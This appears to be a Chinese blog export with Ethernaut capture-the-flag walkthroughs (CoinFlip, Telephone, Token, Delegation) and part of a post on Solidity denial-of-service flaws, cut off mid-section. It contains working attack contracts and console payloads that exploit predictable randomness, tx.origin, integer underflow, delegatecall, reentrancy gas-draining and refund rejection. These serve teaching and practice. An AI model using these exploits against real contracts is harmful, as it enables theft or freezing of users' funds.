class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins &#x3D; 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个合约是一个“掷硬币猜正反”的游戏，要求连续猜对10次极为通关。<br/><br>先来分析一下合约：<br><code>block.number</code>可以用来获取当前交易对应block的编号，而这里减1获取的就是前一个block的编号，而<code>blockhash(id)</code>可以获取对应id的block的hash值，然后uint256将其转换为16进制对应的数值。其中给的factor就是<code>2^{256}/2</code>，所以每次做完除法的结果有一半几率是0，一半是1。<br>这里补充一下几个知识：</p><ul><li><p>补充</p><ul><li><strong>Solidity block对象</strong><br>block.coinbase (address): 当前块的矿工的地址<br>block.difficulty (uint):当前块的难度系数<br>block.gaslimit (uint):当前块gas的上限<br>block.number (uint):当前块编号<br>block.blockhash (function(uint) returns (bytes32)):函数，返回指定块的哈希值，已经被内建函数blockhash所代替<br>block.timestamp (uint):当前块的时间戳</li></ul><p><br/></p><ul><li><p><strong>Revert</strong><br>revert是solidity中的一种错误处理机制，<br>而revert一旦触发，会导致当前调用中的所有更改都被还原并将错误数据传递回调用者。<br>revert由两种使用形式：</p><ul><li>revert ：<code>revert CustomError（arg1， arg2）;</code>该语句将自定义错误作为不带括号的直接参数</li><li>revert() ：<code>revert（）;revert（“description”）;</code>出于向后兼容的原因，还有一个函数，它使用括号并接受字符串</li></ul><p><br/></p></li><li><p><strong>Revert与Require与Assert</strong></p><ul><li>Assert： 可以理解为严厉一点的判断，如果判断失败，将会burn掉你的gas</li><li>Require: 可以理解为温和一点的判断，就算判断失败，gas会返回给调用者</li><li>Revert ：revert的用法和throw很像，也会撤回所有的状态转变。但是它有两点不同：<ol><li>它允许你返回一个值</li><li>它会把所有剩下的gas退回给caller</li></ol></li></ul></li></ul><p>详情参见<a href="https://docs.soliditylang.org/en/latest/control-structures.html#revert-statement" target="_blank" rel="noopener">solidity参考文档</a><br><br/></p></li><li><p>漏洞分析：<br>本题的漏洞就出在通过<code>block.blockhash(block.number - 1)</code>获取负一高度的区块哈希来生成随机数的方式是极易被攻击利用的。</p><blockquote><p>原理是在区块链中，一个区块包含多个交易，我们可以先运行一下上述除法计算的过程获取结果究竟是0还是1，然后再发送对应的结果过去，区块链中块和快之前的间隔大概有10秒，手动去做会有问题，而且不能保证我们计算的合约是否和题目运算调用在同一个block上，因此需要写一个攻击合约完成调用。我们在攻击合约中调用题目中的合约，可以保证两个交易一定被打包在同一个区块上，因此它们获取的<code>block.number.sub(1)</code>是一样的。</p></blockquote><p>其实就是利用了一个区块中可能由多个交易，而我们可以自己创建一个交易，执行与题目中一样的语句后得到的<code>block.number.sub(1)</code>是一样的<br><br/></p><p>攻击合约代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line">import &#39;.&#x2F;CoinFlip.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">  address adr &#x3D; 0xFd288CbD59B3f74A70B10730a076Ad0b59479C56;&#x2F;&#x2F;被攻击合约地址</span><br><span class="line">  CoinFlip coin &#x3D; CoinFlip(adr);</span><br><span class="line"></span><br><span class="line">  function dosome() public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue &#x3D; uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash &#x3D;&#x3D; blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash &#x3D; blockValue;</span><br><span class="line">    uint256 coinFlip &#x3D; blockValue.div(FACTOR);</span><br><span class="line">    bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line">    coin.flip(side);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署成功后只需要执行10次<code>dosome</code>方法即可</p><blockquote><p>我试过编写一个函数用一个for循环来控制<code>dosome()</code>执行的次数，最终以失败告终，应该是由于循环多了之后造成gas超过了gaslimit的上限。<br>解题步骤：</p></blockquote></li></ul><ol><li>将我们的攻击合约部署在测试链上</li><li>执行10次<code>dosome()</code>函数</li><li>通关<br><img src="11.png" alt=""></li></ol><h2 id="04-Telephone"><a href="#04-Telephone" class="headerlink" title="04 Telephone"></a>04 Telephone</h2><p>此题考查<code>tx.origin</code>和<code>msg.sender</code>的区别。没有什么难点<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin !&#x3D; msg.sender) &#123;</span><br><span class="line">      owner &#x3D; _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目要求获得合约所有权，可以看到只要满足<code>tx.origin != msg.sender</code>就行。在此介绍一下<code>tx.origin</code>：</p><blockquote><p>tx.origin是Solidity的一个全局变量，它遍历整个调用栈并返回最初发送调用（或事务）的帐户的地址。</p></blockquote><p><strong>在智能合约中使用此变量进行身份验证会使合约容易受到类似网络钓鱼的攻击。</strong><br/><br>因为tx.origin是交易的原始发起者，而我们可以通过很多方式使得tx.origin作为智能合约的授权变得不可靠。</p><blockquote><p>举个例子：假设A、B、C都是已经部署的合约，如果我们用A去调用C，即A-&gt;C，那么在C合约看来，A既是tx.origin，又是msg.sender。如果调用链是A-&gt;B-&gt;C，那么对于合约C来说，A是tx.origin，B是msg.sender，即msg.sender是直接调用的一方，而tx.origin是交易的原始发起者</p></blockquote><ul><li><p>漏洞分析<br>在此题中，我们只需要写一个攻击合约，使攻击合约通过另一个地址去调用受攻击合约就行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Telephone t;</span><br><span class="line">    constructor(address _adr) public&#123;</span><br><span class="line">        t &#x3D; Telephone(_adr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp () public &#123;</span><br><span class="line">        t.changeOwner(0x100200fF289D4dA0634fF36d7f5D96524f7EFf67);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>总结：<br>tx.origin不应该用于智能合约的授权。更多的时候采用<code>msg.sender == owner</code>来进行判断。<br/><br>但它也有自己使用的场景，比如想要拒绝外部合约调用当前合约则可使用<code>require（tx.origin ==msg.sender）</code>来进行实现。</li></ul><h2 id="05-Token"><a href="#05-Token" class="headerlink" title="05 Token"></a>05 Token</h2><p>这是一个整数溢出的漏洞<br>先看代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; totalSupply &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;&#x3D; 0);</span><br><span class="line">    balances[msg.sender] -&#x3D; _value;</span><br><span class="line">    balances[_to] +&#x3D; _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现，这个合约没有用到<code>SafeMath</code>那么我们就要格外关注是否存在整数溢出型的漏洞。<br>不出意外：在transfer方法中<code>require(balances[msg.sender] - _value &gt;= 0)</code>使明显存在整数下溢的风险的。<br/><br>由于题目中说到我们一开始拥有20个token，那我们只需要向此合约发出交易，<code>_value&gt;20</code>即可使<code>balances[msg.sender] - _value</code> 发生下溢变成一个很大的值从而符合判定条件。</p><ul><li>解题思路</li></ul><ol><li>在控制台调用transfer方法value为21即可<br><img src="08.png" alt=""></li><li>此时查看我们的账户余额已经是一个相当大的值<br><img src="09.png" alt=""></li><li>通关</li></ol></li></ul><h2 id="06-Delegation"><a href="#06-Delegation" class="headerlink" title="06 Delegation"></a>06 Delegation</h2><p>这道题考查对delegatecall()的认识<br>非常危险<br>先看代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) public &#123;</span><br><span class="line">    owner &#x3D; _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) public &#123;</span><br><span class="line">    delegate &#x3D; Delegate(_delegateAddress);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) &#x3D; address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题目的是要拿到合约的所有权，阅读代码后，其实就是想要通过<code>Delegation</code>合约调用<code>Delegate</code>中的<code>pwn()</code>函数，即可完成对<code>owner</code>的修改</p><ul><li>漏洞分析<br>我们注意到<code>Delegation</code>中的fallback()函数有<code>address(delegate).delegatecall(msg.data);</code>出现，而关于delegatecall的有关介绍可以参考我的另一篇博文，我们可以知道delegatecall函数是非常危险的，而且历史上已经多次被用于进行 attack vector. 使用它。<br/><br>我们在这道题当中只需要给<code>Delegation</code>合约转账，触发他的<code>fallback</code>函数并通过函数签名的方式传入<code>data</code>即可</li></ul><p>解题步骤：</p><ol><li>执行<code>contract.sendTransaction({data:web3.utils.keccak256(&quot;pwn()&quot;).slice(0,10)});</code>给当前合约赚一笔帐并指定data<br><img src="10.png" alt=""></li><li>通关</li></ol>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拒绝服务漏洞</title>
      <link href="/Denial-Service/"/>
      <url>/Denial-Service/</url>
      
        <content type="html"><![CDATA[<h1 id="合约中的拒绝服务漏洞："><a href="#合约中的拒绝服务漏洞：" class="headerlink" title="合约中的拒绝服务漏洞："></a>合约中的拒绝服务漏洞：</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="何为Dos"><a href="#何为Dos" class="headerlink" title="何为Dos"></a>何为Dos</h2><p>DoS 是DenialOfService，拒绝服务的缩写[3]，从字面上来理解，就是用户所需要的服务请求无法被系统处理。<br>打个比方来形容DoS，火车站是为大家提供乘车服务的，如果想要DoS火车站的话，方法有很多，可以占用过道不上车，堵住售票点不付钱，阻挠列车员或者司机不让开车，甚至用破坏铁轨等更加极端的手段来影响车站服务的正常运营。<br>过去针对互联网的DoS有很多种方法，但基本分为三大类：利用软件实现的缺陷，利用协议的漏洞，利用资源压制[3]。<br>此外还有DDoS，称为分布式DoS，其区别就是攻击者利用远程操控的计算机同时向目标发起进攻，在上面的比喻中可以理解为雇佣了几百个地痞流氓来做同样的事影响车站的运作。</p><h2 id="事件回顾"><a href="#事件回顾" class="headerlink" title="事件回顾"></a>事件回顾</h2><p>2016年2月6日至8日The King of the Ether Throne（以下简称KotET）“纷争时代”（Turbulent Age）期间，许多游戏中的退位君王的补偿和未接受款项无法退回用户玩家的钱包.<br>具有讽刺意味的是同年6月，连庞氏骗局GovernMental的合约也遭遇DoS攻击，当时1100以太币是通过使用250万gas交易获得[2]，这笔交易超出了合约能负荷的gas上限，带来交易活动的暂停。<br/><br>无论是蓄意破坏交易正常流程还是阻塞交易通道，都用到了一个互联网时代已经盛行已久的攻击方式——DoS，也就是我们所说的拒绝服务攻击。<br>这种攻击方式可以让合约执行的正常的交易操作被扰乱，中止，冻结，更严重的是让合约本身的逻辑无法运行</p><h2 id="已知漏洞的类型"><a href="#已知漏洞的类型" class="headerlink" title="已知漏洞的类型"></a>已知漏洞的类型</h2><ol><li>未设定gas费率的外部调用</li><li>依赖外部的调用进展</li><li>owner错误操作</li><li>数组或映射过长</li><li>逻辑设计错误</li><li>缺少依赖库</li></ol><h2 id="未设定gas费率的外部调用"><a href="#未设定gas费率的外部调用" class="headerlink" title="未设定gas费率的外部调用"></a>未设定gas费率的外部调用</h2><p>在合约中你可能想要通过call调用去执行某些东西的时候，因为未设定gas费率导致可能发生恶意的调用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"> </span><br><span class="line">import &#39;@openzeppelin&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"> </span><br><span class="line">contract Denial &#123;</span><br><span class="line"> </span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    address public partner; &#x2F;&#x2F; withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address payable public constant owner &#x3D; address(0xA9E);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address &#x3D;&gt; uint) withdrawPartnerBalances; &#x2F;&#x2F; keep track of partners balances</span><br><span class="line"> </span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner &#x3D; _partner;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amountToSend &#x3D; address(this).balance.div(100);</span><br><span class="line">        &#x2F;&#x2F; perform a call without checking return</span><br><span class="line">        &#x2F;&#x2F; The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call.value(amountToSend)(&quot;&quot;);</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        &#x2F;&#x2F; keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn &#x3D; now;</span><br><span class="line">        withdrawPartnerBalances[partner] &#x3D; withdrawPartnerBalances[partner].add(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; allow deposit of funds</span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; convenience function</span><br><span class="line">    function contractBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner 自然收不到钱了，从而造成DOS。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address &#x3D; instance_address_here;</span><br><span class="line">    Denial target &#x3D; Denial(instance_address);</span><br><span class="line"> </span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.setWithdrawPartner(address(this));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function () payable public &#123;</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>或者assert 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address &#x3D; instance_address_here;</span><br><span class="line">    Denial target &#x3D; Denial(instance_address);</span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.setWithdrawPartner(address(this));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">    function () payable public &#123;</span><br><span class="line">        assert(0&#x3D;&#x3D;1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>解决方案<blockquote><p>使用call函数时可以调试出执行操作需要的大致gas费率，在call函数指定稍大一些费率，避免攻击发生。</p><h2 id="依赖外部的调用进展"><a href="#依赖外部的调用进展" class="headerlink" title="依赖外部的调用进展"></a>依赖外部的调用进展</h2><p>这类漏洞常见于竞拍的合约当中，你的想法是如果有人出价高于现阶段的价格，就把当前的竞拍者的token退还给他，再去更新竞拍者，殊不知transfer函数执行失败后，亦会使下面的步骤无法执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"> </span><br><span class="line">contract King &#123;</span><br><span class="line"> </span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"> </span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;  </span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; prize || msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>谁发送大于 king 的金额就能成为新的 king，但是要先把之前的国王的钱退回去才能更改 king。只要我们一直不接受退回的奖金，那我们就能够一直保持 king 的身份，那就把合约的fallback函数不弄成payable就能一直不接受了。当然第一步是先成为King</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"> </span><br><span class="line">contract Attacker&#123;</span><br><span class="line">    constructor(address target) public payable&#123;</span><br><span class="line">        target.call.gas(1000000).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;未定义fallback函数，就没有payable修饰</span><br></pre></td></tr></table></figure></blockquote></li><li>解决方案</li></ul><h2 id="owner错误操作"><a href="#owner错误操作" class="headerlink" title="owner错误操作"></a>owner错误操作</h2><p>本类型涉及到函数修饰关键词的使用，owner可以设定合约的当前状态，因为错误的操作使得当前合约的状态设置为不可交易，出现非主观的拒绝服务。将令牌系统理解为股市，有时需要进行休市操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"> </span><br><span class="line">contract error&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool activestatus;</span><br><span class="line"> </span><br><span class="line">    modifier onlyowner&#123;</span><br><span class="line">        require(msg.sender&#x3D;&#x3D;owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier active&#123;</span><br><span class="line">        require(activestatus);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    function activecontract() onlyowner&#123;</span><br><span class="line">        activestatus &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">    function inactivecontract() onlyowner&#123;</span><br><span class="line">        activestatus &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">    function transfer() active&#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如果owner调用了inactivecontract函数，使得activestatus变成false</p><p>之后所有被active修饰的函数都无法调用，无法通过require判定</p><p>令牌生态系统的整个操作取决于一个地址，这是非常危险的</p><h2 id="数组或映射过长"><a href="#数组或映射过长" class="headerlink" title="数组或映射过长"></a>数组或映射过长</h2><p>本类型的漏洞存在于利益分发合约，类似于公司给股东的分红，但是由于以太坊区块有gas费率交易上限，如果数组过大会导致操作执行的gas远远超出上限，从而导致交易失败，也就无法分红<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract DistributeTokens &#123;</span><br><span class="line">    address public owner; &#x2F;&#x2F; gets set somewhere</span><br><span class="line">    address[] investors; &#x2F;&#x2F; array of investors</span><br><span class="line">    uint[] investorTokens; &#x2F;&#x2F; the amount of tokens each investor gets</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; ... extra functionality, including transfertoken()</span><br><span class="line"> </span><br><span class="line">    function invest() public payable &#123;</span><br><span class="line">        investors.push(msg.sender);</span><br><span class="line">        investorTokens.push(msg.value * 5); &#x2F;&#x2F; 5 times the wei sent</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    function distribute() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner); &#x2F;&#x2F; only owner</span><br><span class="line">        for(uint i &#x3D; 0; i &lt; investors.length; i++) &#123; </span><br><span class="line">            &#x2F;&#x2F; here transferToken(to,amount) transfers &quot;amount&quot; of tokens to the address &quot;to&quot;</span><br><span class="line">            transferToken(investors[i],investorTokens[i]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>该漏洞的另一个关键点在于循环遍历的数组可以被人为扩充<br>在distribute()函数中使用的循环数组的扩充在invert()函数里面，但是invert()函数是public属性，也就意味着可以创建很多的用户账户，让数组变得非常大，从而使distribute()函数因为超出以太坊区块gas费率上限而无法成功执行</p><h2 id="依赖库问题"><a href="#依赖库问题" class="headerlink" title="依赖库问题"></a>依赖库问题</h2><p>依赖外部的合约库。如果外部合约的库被删除，那么所有依赖库的合约服务都无法使用。有些合约用于接受ether，并转账给其他地址。但是，这些合约本身并没有自己实现一个转账函数，而是通过delegatecall去调用一些其他合约中的转账函数去实现转账的功能。</p><p>万一这些提供转账功能的合约执行suicide或self-destruct操作的话，那么，通过delegatecall调用转账功能的合约就有可能发生ether被冻结的情况</p><p>Parity 钱包遭受的第二次攻击是一个很好的例子。</p><p>Parity 钱包提供了多签钱包的库合约。当库合约的函数被 delegatecall 调用时，它是运行在调用方（即：用户多签合约）的上下文里，像 m_numOwners 这样的变量都来自于用户多签合约的上下文。另外，为了能被用户合约调用，这些库合约的初始化函数都是public的。</p><p>库合约本质上也不过是另外一个智能合约，这次攻击调用使用的是库合约本身的上下文，对调用者而言这个库合约是未经初始化的。</p><ul><li><p>攻击流程</p><p>1.攻击者调用初始化函数把自己设置为库合约的 owner。</p><p>2.攻击者调用 kill() 函数，把库合约删除，所有的 ether 